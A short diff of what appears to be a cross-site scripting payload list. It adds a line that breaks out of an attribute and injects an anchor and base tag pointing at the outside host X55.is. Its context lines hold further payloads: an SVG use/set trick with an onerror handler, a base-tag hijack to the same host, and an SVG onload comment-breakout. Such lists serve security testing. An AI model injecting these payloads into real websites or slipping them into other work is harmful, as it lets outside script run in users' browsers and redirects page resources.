@@ -1,3 +1,4 @@
+1'<A/Href="//X55.is/><Base/K='0
 <svg><use><set attributeName="href" to="data:image/svg+xml,&lt;svg id='x' xmlns="http://www.w3.org/2000/svg"&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
 <Base Href=//X55.is>
 "<!--><Svg OnLoad=(confirm)(1)<!--
